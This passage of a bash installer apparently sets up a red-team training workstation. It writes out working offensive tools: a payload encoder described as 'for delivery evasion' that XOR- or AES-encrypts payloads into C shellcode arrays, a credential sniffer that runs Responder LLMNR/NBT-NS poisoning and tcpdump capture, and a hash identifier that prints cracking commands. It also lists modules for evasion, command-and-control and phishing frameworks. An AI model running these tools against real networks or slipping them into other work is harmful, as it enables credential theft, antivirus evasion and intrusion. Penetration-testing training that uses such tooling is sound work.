    (r'^\$krb5tgs\$', 'Kerberos TGS-REP (Kerberoast)', '13100', 'krb5tgs'),
    (r'^\$krb5asrep\$', 'Kerberos AS-REP', '18200', 'krb5asrep'),
    (r'^[a-zA-Z0-9/\+]+=*$', 'Possible Base64', '', ''),
    (r'^\{SSHA\}', 'SSHA (LDAP)', '111', 'ssha'),
    (r'^\$P\$', 'phpass (WordPress)', '400', 'phpass'),
    (r'^\$H\$', 'phpass (phpBB)', '400', 'phpass'),
    (r'^sha1\$', 'Django SHA-1', '124', ''),
    (r'^pbkdf2_sha256\$', 'Django PBKDF2-SHA256', '10000', ''),
    (r'^\$argon2i[d]?\$', 'Argon2', '', ''),
]

def identify(h):
    h = h.strip()
    matches = []
    for pattern, name, hashcat_mode, john_format in HASH_PATTERNS:
        if re.match(pattern, h, re.IGNORECASE):
            matches.append((name, hashcat_mode, john_format))
    return matches

def main():
    if len(sys.argv) > 1:
        hash_input = sys.argv[1]
    else:
        hash_input = sys.stdin.read().strip()

    if not hash_input:
        print("Usage: hash-id.py <hash>")
        sys.exit(1)

    print(f"\n[*] Hash: {hash_input[:80]}{'...' if len(hash_input) > 80 else ''}")
    print(f"[*] Length: {len(hash_input)}\n")

    matches = identify(hash_input)
    if matches:
        print(f"{'Type':<30} {'Hashcat Mode':<15} {'John Format'}")
        print("-" * 60)
        for name, hc, jn in matches:
            print(f"{name:<30} {hc:<15} {jn}")
        if matches[0][1]:
            print(f"\n[*] Hashcat: hashcat -m {matches[0][1]} hash.txt wordlist.txt")
        if matches[0][2]:
            print(f"[*] John:    john --format={matches[0][2]} hash.txt")
    else:
        print("[-] No matching hash type found")

if __name__ == "__main__":
    main()
HASHID
    chmod +x "${CUSTOM_TOOLS_DIR}/hash-id.py"

    # ── 9. Payload Encoder (XOR / Base64 / AES) ──
    cat > "${CUSTOM_TOOLS_DIR}/payload-encode.py" << 'ENCODER'
#!/usr/bin/env python3
"""Encode payloads for delivery evasion.
Usage: payload-encode.py <input_file> --method xor|b64|aes [--key <key>]
"""
import argparse
import base64
import os
import sys

def xor_encode(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_encode(data, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
    except ImportError:
        print("[-] pycryptodome required: pip install pycryptodome")
        sys.exit(1)
    iv = os.urandom(16)
    key_bytes = key.encode().ljust(32, b'\x00')[:32]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return iv + encrypted

def main():
    parser = argparse.ArgumentParser(description="Payload encoder")
    parser.add_argument("input", help="Input file")
    parser.add_argument("-m", "--method", choices=["xor", "b64", "aes"],
                        default="xor", help="Encoding method")
    parser.add_argument("-k", "--key", default="redteam",
                        help="Encryption key (for xor/aes)")
    parser.add_argument("-o", "--output", help="Output file")
    args = parser.parse_args()

    with open(args.input, "rb") as f:
        data = f.read()

    print(f"[*] Input: {args.input} ({len(data)} bytes)")
    print(f"[*] Method: {args.method}")

    if args.method == "xor":
        encoded = xor_encode(data, args.key.encode())
        # Output as C array
        c_array = ", ".join(f"0x{b:02x}" for b in encoded)
        print(f"\n// XOR key: {args.key}")
        print(f"unsigned char buf[] = {{ {c_array} }};")
        print(f"unsigned int buf_len = {len(encoded)};")
    elif args.method == "b64":
        encoded = base64.b64encode(data)
        print(f"\n{encoded.decode()}")
    elif args.method == "aes":
        encoded = aes_encode(data, args.key)
        b64 = base64.b64encode(encoded).decode()
        print(f"\n// AES-256-CBC, key: {args.key}")
        print(f"// First 16 bytes = IV")
        print(f"{b64}")

    if args.output:
        out = encoded if args.method != "b64" else encoded
        with open(args.output, "wb") as f:
            f.write(out)
        print(f"\n[+] Written to {args.output}")

if __name__ == "__main__":
    main()
ENCODER
    chmod +x "${CUSTOM_TOOLS_DIR}/payload-encode.py"

    # ── 10. Network Credential Sniffer Wrapper ──
    cat > "${CUSTOM_TOOLS_DIR}/cred-sniff.sh" << 'CREDSNIFF'
#!/usr/bin/env bash
# Quick credential sniffing setup with Responder + tcpdump.
# Usage: cred-sniff.sh <interface> [--responder] [--tcpdump]
set -euo pipefail

IFACE="${1:?Usage: cred-sniff.sh <interface> [--responder] [--tcpdump]}"
MODE="${2:---responder}"
OUT_DIR="./cred-capture-$(date +%Y%m%d-%H%M%S)"
mkdir -p "${OUT_DIR}"

echo "[*] Credential Capture Setup"
echo "[*] Interface: ${IFACE}"
echo "[*] Output: ${OUT_DIR}"
echo ""

case "${MODE}" in
    --responder)
        if [ -d /opt/red-team/Responder ]; then
            echo "[>] Starting Responder (LLMNR/NBT-NS/MDNS poisoning)..."
            python3 /opt/red-team/Responder/Responder.py -I "${IFACE}" -dwPv
        elif command -v responder &>/dev/null; then
            responder -I "${IFACE}" -dwPv
        else
            echo "[-] Responder not found"
            exit 1
        fi
        ;;
    --tcpdump)
        echo "[>] Starting credential-focused packet capture..."
        echo "[*] Capturing FTP, HTTP, SMTP, POP3, IMAP, Telnet credentials"
        tcpdump -i "${IFACE}" -w "${OUT_DIR}/capture.pcap" \
            'port 21 or port 23 or port 25 or port 80 or port 110 or port 143 or port 445 or port 3389' &
        TCPDUMP_PID=$!
        echo "[*] tcpdump PID: ${TCPDUMP_PID}"
        echo "[*] Press Enter to stop capture"
        read -r
        kill "${TCPDUMP_PID}" 2>/dev/null
        echo "[+] Capture saved to ${OUT_DIR}/capture.pcap"
        ;;
    *)
        echo "[-] Unknown mode: ${MODE}"
        exit 1
        ;;
esac
CREDSNIFF
    chmod +x "${CUSTOM_TOOLS_DIR}/cred-sniff.sh"

    # Make all custom tools accessible from PATH
    if [ ! -L /usr/local/bin/rta-scan ]; then
        ln -sf "${CUSTOM_TOOLS_DIR}/quick-scan.py" /usr/local/bin/rta-scan
        ln -sf "${CUSTOM_TOOLS_DIR}/subdomain-aggregator.sh" /usr/local/bin/rta-subenum
        ln -sf "${CUSTOM_TOOLS_DIR}/revshell.py" /usr/local/bin/rta-revshell
        ln -sf "${CUSTOM_TOOLS_DIR}/serve.py" /usr/local/bin/rta-serve
        ln -sf "${CUSTOM_TOOLS_DIR}/ad-quick-enum.sh" /usr/local/bin/rta-adenum
        ln -sf "${CUSTOM_TOOLS_DIR}/web-recon.sh" /usr/local/bin/rta-webrecon
        ln -sf "${CUSTOM_TOOLS_DIR}/listener.sh" /usr/local/bin/rta-listener
        ln -sf "${CUSTOM_TOOLS_DIR}/hash-id.py" /usr/local/bin/rta-hashid
        ln -sf "${CUSTOM_TOOLS_DIR}/payload-encode.py" /usr/local/bin/rta-encode
        ln -sf "${CUSTOM_TOOLS_DIR}/cred-sniff.sh" /usr/local/bin/rta-credsniff
    fi

    log INFO "Custom tools installed to ${CUSTOM_TOOLS_DIR}"
    log INFO "Available as: rta-scan, rta-subenum, rta-revshell, rta-serve,"
    log INFO "  rta-adenum, rta-webrecon, rta-listener, rta-hashid, rta-encode, rta-credsniff"
}

# ── Shell Configuration ──────────────────────────────────────────────────

configure_shell() {
    section "Shell Configuration"

    local bashrc="${REAL_HOME}/.bashrc"
    local zshrc="${REAL_HOME}/.zshrc"
    local rta_profile="${REAL_HOME}/.rta-profile"

    # Create shared profile
    cat > "${rta_profile}" << 'RTAPROFILE'
# ── Red Team Academy Environment ──
export TOOLS_DIR="/opt/red-team"
export WORDLIST_DIR="/opt/wordlists"
export PATH="${PATH}:/opt/red-team/custom:/usr/local/go/bin:${HOME}/.cargo/bin:${HOME}/.local/bin"

# Aliases — Navigation
alias tools='cd /opt/red-team'
alias wordlists='cd /opt/wordlists'
alias custom='cd /opt/red-team/custom'

# Aliases — Common operations
alias serve='python3 -m http.server 8080'
alias scan='rta-scan'
alias subenum='rta-subenum'
alias revshell='rta-revshell'
alias hashid='rta-hashid'

# Aliases — Tool shortcuts
alias nxc='netexec'
alias bh='bloodhound'
alias msfconsole='msfconsole -q'
alias responder='python3 /opt/red-team/Responder/Responder.py'

# Aliases — Network
alias myip='curl -s ifconfig.me; echo'
alias localip='hostname -I | awk "{print \$1}"'
alias ports='ss -tulnp'
alias listening='ss -tulnp | grep LISTEN'

# Quick target setup
target() {
    export TARGET="$1"
    export RHOST="$1"
    echo "[*] Target set to: ${TARGET}"
}

# Proxy through SOCKS
socks() {
    local port="${1:-1080}"
    export ALL_PROXY="socks5://127.0.0.1:${port}"
    export http_proxy="socks5://127.0.0.1:${port}"
    export https_proxy="socks5://127.0.0.1:${port}"
    echo "[*] SOCKS proxy set to 127.0.0.1:${port}"
}

unsocks() {
    unset ALL_PROXY http_proxy https_proxy
    echo "[*] Proxy cleared"
}

# Extract function
extract() {
    if [ -f "$1" ]; then
        case "$1" in
            *.tar.bz2) tar xjf "$1" ;;
            *.tar.gz)  tar xzf "$1" ;;
            *.bz2)     bunzip2 "$1" ;;
            *.rar)     unrar x "$1" ;;
            *.gz)      gunzip "$1" ;;
            *.tar)     tar xf "$1" ;;
            *.tbz2)    tar xjf "$1" ;;
            *.tgz)     tar xzf "$1" ;;
            *.zip)     unzip "$1" ;;
            *.Z)       uncompress "$1" ;;
            *.7z)      7z x "$1" ;;
            *)         echo "'$1' cannot be extracted" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}
RTAPROFILE

    # Source from bash
    if [ -f "${bashrc}" ]; then
        if ! grep -q "rta-profile" "${bashrc}"; then
            echo -e "\n# Red Team Academy\n[ -f ~/.rta-profile ] && source ~/.rta-profile" >> "${bashrc}"
        fi
    fi

    # Source from zsh
    if [ -f "${zshrc}" ]; then
        if ! grep -q "rta-profile" "${zshrc}"; then
            echo -e "\n# Red Team Academy\n[ -f ~/.rta-profile ] && source ~/.rta-profile" >> "${zshrc}"
        fi
    fi

    chown "${REAL_USER}:${REAL_USER}" "${rta_profile}"

    log INFO "Shell profile configured (source ~/.rta-profile)"
}

# ── Summary Report ───────────────────────────────────────────────────────

print_summary() {
    section "Installation Summary"

    echo -e "  ${GREEN}Installed:${NC}  ${#INSTALLED_TOOLS[@]} tools"
    echo -e "  ${BLUE}Skipped:${NC}    ${#SKIPPED_TOOLS[@]} (already present)"
    echo -e "  ${RED}Failed:${NC}     ${#FAILED_TOOLS[@]}"
    echo ""

    if [ ${#FAILED_TOOLS[@]} -gt 0 ]; then
        echo -e "  ${RED}Failed tools:${NC}"
        for tool in "${FAILED_TOOLS[@]}"; do
            echo -e "    ${RED}-${NC} ${tool}"
        done
        echo ""
    fi

    echo -e "  ${BOLD}Directory Layout:${NC}"
    echo "    /opt/red-team/          — Cloned tool repos"
    echo "    /opt/red-team/custom/   — RTA custom tools (rta-*)"
    echo "    /opt/red-team/venvs/    — Python virtual environments"
    echo "    /opt/red-team/go-tools/ — Go module cache"
    echo "    /opt/wordlists/         — SecLists, OneListForAll, etc."
    echo ""
    echo -e "  ${BOLD}Custom Tools:${NC}"
    echo "    rta-scan       — Quick async port scanner"
    echo "    rta-subenum    — Multi-source subdomain aggregator"
    echo "    rta-revshell   — Reverse shell one-liner generator"
    echo "    rta-serve      — HTTP file server with upload"
    echo "    rta-adenum     — AD quick enumeration wrapper"
    echo "    rta-webrecon   — Automated web recon pipeline"
    echo "    rta-listener   — Multi-type listener setup"
    echo "    rta-hashid     — Hash type identifier"
    echo "    rta-encode     — Payload encoder (XOR/B64/AES)"
    echo "    rta-credsniff  — Credential sniffing wrapper"
    echo ""
    echo -e "  ${BOLD}Next Steps:${NC}"
    echo "    1. Source your profile:  source ~/.rta-profile"
    echo "    2. Update Nuclei:       nuclei -ut"
    echo "    3. Start Metasploit DB: sudo msfdb init"
    echo "    4. Test custom tools:   rta-revshell 10.10.14.5 4444 --all"
    echo ""
    echo -e "  Full log: ${LOG_FILE}"
    echo ""
}

# ── CLI Argument Parsing ─────────────────────────────────────────────────

usage() {
    echo "Usage: sudo $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --all              Install everything"
    echo "  --module <name>    Install a specific module (repeatable)"
    echo "  --list             List available modules"
    echo "  --dry-run          Preview without installing"
    echo "  --help             Show this help"
    echo ""
    echo "Modules:"
    echo "  core               System packages, compilers, Docker, Go, Rust"
    echo "  recon              Nmap, subfinder, amass, ffuf, httpx, nuclei, etc."
    echo "  ad                 Impacket, NetExec, BloodHound, Certipy, etc."
    echo "  exploitation       Metasploit, sqlmap, pwntools, exploit repos"
    echo "  post-exploitation  PEASS-ng, privesc tools, lateral movement"
    echo "  evasion            ScareCrow, Donut, Freeze, obfuscation tools"
    echo "  c2                 Sliver, Havoc, Mythic, GoPhish, Evilginx"
    echo "  web                SQLMap, SSRF/GraphQL/SSTI tools, Burp helpers"
    echo "  wireless           Aircrack-ng, Bettercap, EAPHammer, Kismet"
    echo "  iot                Firmware analysis, RouterSploit, EMBA"
    echo "  pivoting           Chisel, Ligolo-ng, dnscat2, rpivot"
    echo "  password           Hashcat, John, Hydra, wordlist generators"
    echo "  cloud              AWS/Azure/GCP CLIs, Pacu, ScoutSuite"
    echo "  mobile             Frida, Objection, MobSF, APKTool"
    echo "  network            Responder, mitm6, Bettercap, ARP tools"
    echo "  ai                 LLM security testing, Garak, AI frameworks"
    echo "  dev-tools          Compilers, offensive Python/Go libs"
    echo "  wordlists          SecLists, OneListForAll, FuzzDB, Rockyou"
    echo "  custom-tools       RTA custom scripts and utilities"
    echo ""
    echo "Examples:"
    echo "  sudo $0 --all"
    echo "  sudo $0 --module core --module recon --module ad"
    echo "  sudo $0 --dry-run --module web"
}

parse_args() {
    if [ $# -eq 0 ]; then
        usage
        exit 0
    fi

    while [ $# -gt 0 ]; do
        case "$1" in
            --all)
                INSTALL_MODULES=(core recon ad exploitation post-exploitation \
                    evasion c2 web wireless iot pivoting password cloud \
                    mobile network ai dev-tools wordlists custom-tools)
                shift
                ;;
            --module)
                INSTALL_MODULES+=("$2")
                shift 2
                ;;
            --list)
                echo "Available modules:"
                echo "  core, recon, ad, exploitation, post-exploitation,"
                echo "  evasion, c2, web, wireless, iot, pivoting, password,"
                echo "  cloud, mobile, network, ai, dev-tools, wordlists,"
                echo "  custom-tools"
                exit 0
                ;;
            --dry-run)
                DRY_RUN=true
                shift
                ;;
            --help|-h)
                usage
                exit 0
                ;;
            *)
                echo "Unknown option: $1"
                usage
                exit 1
                ;;
        esac
    done
}

run_modules() {
    for module in "${INSTALL_MODULES[@]}"; do
        case "${module}" in
            core)              install_core ;;
            recon)             install_recon ;;
            ad)                install_ad ;;
            exploitation)      install_exploitation ;;
            post-exploitation) install_post_exploitation ;;
            evasion)           install_evasion ;;
            c2)                install_c2 ;;
            web)               install_web ;;
            wireless)          install_wireless ;;
            iot)               install_iot ;;
            pivoting)          install_pivoting ;;
            password)          install_password ;;
            cloud)             install_cloud ;;
            mobile)            install_mobile ;;
            network)           install_network ;;
            ai)                install_ai ;;
            dev-tools)         install_dev_tools ;;
            wordlists)         install_wordlists ;;
            custom-tools)      install_custom_tools ;;
            *)
                log ERROR "Unknown module: ${module}"
                ;;
        esac
    done
}

# ── Main ─────────────────────────────────────────────────────────────────

main() {
    parse_args "$@"
    banner

    if [ "${DRY_RUN}" = true ]; then
        echo -e "  ${YELLOW}DRY RUN MODE — no changes will be made${NC}"
        echo ""
    fi

    preflight
    run_modules
    configure_shell
    print_summary
}

main "$@"
